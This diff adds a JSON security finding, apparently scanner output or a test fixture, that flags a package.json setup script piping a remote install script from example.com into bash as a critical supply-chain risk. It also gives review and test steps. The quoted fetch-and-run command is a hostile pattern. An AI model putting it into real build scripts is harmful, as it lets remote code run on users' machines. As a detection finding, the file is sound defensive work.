@@ -1,0 +1,20 @@
+[
+  {
+    "id": "VG-DEP-001",
+    "severity": "critical",
+    "file": "package.json",
+    "title": "Package script added remote or dynamic code execution.",
+    "evidence": [
+      "Added: \"setup\": \"curl -s https://example.com/install.sh | bash\","
+    ],
+    "why": "Scripts that pipe remote content to a shell or use eval() can execute arbitrary code, creating a supply chain attack vector.",
+    "review": [
+      "Verify the script source is trusted and pinned to a specific version.",
+      "Replace curl|bash patterns with verified package manager installs."
+    ],
+    "test": [
+      "Run the script in an isolated environment and inspect network requests.",
+      "Verify no unexpected code is executed beyond the intended operation."
+    ]
+  }
+]
